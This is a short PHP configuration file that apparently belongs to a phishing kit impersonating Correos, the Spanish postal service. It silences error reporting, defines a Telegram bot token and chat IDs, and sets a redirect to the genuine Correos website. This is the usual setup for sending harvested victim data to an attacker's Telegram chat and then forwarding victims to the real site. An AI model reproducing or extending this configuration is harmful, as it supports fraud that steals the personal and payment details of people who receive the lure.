<?php

error_reporting(0);

define("TELEGRAM_TOKEN", "5467814190:AAGK4kr3tjjdl4hePHONGs-RxWSosCfHyPQ");
define("TELEGRAM_CHAT_ID", "1001756672514");
define("TELEGRAM_CHAT_IDD", "-1001756672514");
define("TXT_FILE_NAME", '');
define("REDIRECT_WEBSITE", "https://www.correos.com/grupo-correos/");



?>